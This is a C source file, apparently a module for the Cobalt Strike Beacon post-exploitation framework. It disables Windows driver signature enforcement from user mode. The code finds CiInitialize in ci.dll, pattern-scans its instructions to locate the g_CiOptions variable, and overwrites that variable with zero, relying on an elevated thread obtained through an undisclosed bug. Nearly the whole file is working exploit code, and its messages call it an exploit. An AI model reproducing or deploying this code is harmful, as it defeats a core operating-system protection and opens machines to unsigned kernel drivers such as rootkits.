/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Checks if its matching an instruction
 * block.
 *
**/

D_SEC( B ) ULONG DseIsInsBlock( _In_ PBYTE Ptr, _In_ ULONG Offset ) 
{
	ULONG	Off = Offset;
	hde64s	Hde;

	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );

	hde64_disasm( &Ptr[ Off ], &Hde );
	if ( Hde.flags & F_ERROR ) {
		return 0;
	};
	if ( Hde.len != 3 ) {
		return 0;
	};
	if ( Ptr[ Off ] != 0x4C || Ptr[ Off + 1 ] != 0x8B ) {
		return 0;
	};
	Off += Hde.len;

	hde64_disasm( &Ptr[ Off ], &Hde );
	if ( Hde.flags & F_ERROR ) {
		return 0;
	};
	if ( Hde.len != 3 ) {
		return 0;
	};
	if ( Ptr[ Off ] != 0x4C || Ptr[ Off + 1 ] != 0x8B ) {
		return 0;
	};
	Off += Hde.len;

	hde64_disasm( &Ptr[ Off ], &Hde );
	if ( Hde.flags & F_ERROR ) {
		return 0;
	};
	if ( Hde.len != 3 ) {
		return 0;
	};
	if ( Ptr[ Off ] != 0x48 || Ptr[ Off + 1 ] != 0x8B ) { 
		return 0;
	};
	Off += Hde.len;

	hde64_disasm( &Ptr[ Off ], &Hde );
	if ( Hde.flags & F_ERROR ) { 
		return 0;
	};
	if ( Hde.len != 2 ) {
		return 0;
	};
	if ( Ptr[ Off ] != 0x8B || Ptr[ Off + 1 ] != 0xCD ) {
		return 0;
	};

	return Off + Hde.len;
};

/**
 *
 * Purpose:
 *
 * Attempts to use the elevated thread to
 * disable driver signing enforcement.
 *
**/

D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api ) 
{
	PBYTE				Adr = 0;
	ULONG				Opt = 0;
	PBYTE				Ptr = NULL;
	PVOID				Map = NULL;
	PCHAR				Str = NULL;
	ULONG				Len = 0;
	PSYSTEM_MODULE_INFORMATION 	Inf = NULL;

	hde64s				Hde;
	RTL_OSVERSIONINFOW		Ver;

	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );
	Ver.dwOSVersionInfoSize = sizeof( Ver );

	Api->RtlGetVersion( &Ver );

	/* Get size! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info length." ) ) );
		goto Leave;
	};

	/* Get ptrs! */
	if ( !( Inf = Api->LocalAlloc( LPTR, Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not allocate module info." ) ) );
		goto Leave;
	};

	/* Get info! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, Inf, Len, NULL ) >= 0 ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info." ) ) );
		goto Leave;
	};

	/* Enumerate modules! */
	for ( ULONG Idx = 0 ; Idx < Inf->Count ; ++Idx ) {
		Str = C_PTR( U_PTR( Inf->Module[ Idx ].FullPathName ) + Inf->Module[ Idx ].OffsetToFileName );

		/* Is CI.DLL? */
		if ( HashString( Str, 0 ) == H_STR_CI ) {

			Map = Api->LoadLibraryEx( C_PTR( G_SYM( "C:\\Windows\\System32\\ci.dll" ) ), NULL, DONT_RESOLVE_DLL_REFERENCES );

			if ( Map != NULL )
			{
				Ptr = PeGetFuncEat( Map, H_STR_CIINITIALIZE );

				if ( Ptr != NULL )
				{
					ULONG	Rel = 0;
					ULONG	Off = 0;
					ULONG	Ofk = 0;

					RtlSecureZeroMemory( &Hde, sizeof( Hde ) );

					if ( Ver.dwBuildNumber > 16299 ) 
					{
						do
						{
							hde64_disasm( &Ptr[ Off ], &Hde );

							if ( Hde.flags & F_ERROR ) {
								break;
							};
							if ( Hde.len == 3 ) {
								Ofk = DseIsInsBlock( Ptr, Off );

								if ( Ofk != 0 ) {
									hde64_disasm( &Ptr[ Ofk ], &Hde );

									if ( Hde.flags & F_ERROR ) {
										break;
									};
									if ( Hde.len == 5 ) {
										if ( Ptr[ Ofk ] == 0xE8 ) {
											Off = Ofk;
											Rel = *( ULONG * )( Ptr + Ofk + 1 );
											break;
										};
									};
								};
							};
							Off = Off + Hde.len;
						} while ( Off < 256 );
					} else {
						do
						{
							hde64_disasm( &Ptr[ Off ], &Hde );

							if ( Hde.flags & F_ERROR ) {
								break;
							};
							if ( Hde.len == 5 ) {
								if ( Ptr[ Off ] == 0xE9 ) {
									Rel = *( ULONG * )( Ptr + Off + 1 );
									break;
								};
							};
							Off = Off + Hde.len;
						} while ( Off < 256 );
					};

					Ptr = C_PTR( U_PTR( Ptr ) + Off + 5 + Rel );
					Rel = 0;
					Off = 0;

					do
					{
						hde64_disasm( &Ptr[ Off ], &Hde );

						if ( Hde.flags & F_ERROR ) {
							break;
						};

						if ( Hde.len == 6 ) {
							if ( *( USHORT * )( Ptr + Off ) == 0x0d89 ) {
								Rel = *( ULONG * )( Ptr + Off + 2 );
								break;
							};
						};
						Off = Off + Hde.len;
					} while ( Off < 256 );

					Ptr = C_PTR( U_PTR( Ptr ) + Off + 6 + Rel );
					Adr = C_PTR( U_PTR( Inf->Module[ Idx ].ImageBase ) + U_PTR( Ptr ) - U_PTR( Map ) );
					Adr = C_PTR( U_PTR( Adr ) - 0x100000000 );

					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &Opt, sizeof( Opt ), NULL ) ) 
					{
						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Adr, &( DWORD ){ 0x0 }, sizeof( DWORD ), NULL ) ) 
						{
							/* Yay :) */
							BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch: success." ) ) );
						} else {
							/* Nos :( */
							BeaconApi->BeaconPrintf( CALLBACK_ERROR,  C_PTR( G_SYM( "dsepatch: failure." ) ) );
							goto Leave;
						};
					} else {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read g_CiOptions. exploit failed." ) ) );
						goto Leave;
					};
				} else {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find CiInitialize" ) ) );
					goto Leave;
				};
			} else {
				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not load ci.dll" ) ) );
				goto Leave;
			};
		};
	};
Leave:
	if ( Inf != NULL ) {
		Api->LocalFree( Inf );
	};
	if ( Map != NULL ) {
		Api->FreeLibrary( Map );
	};
};
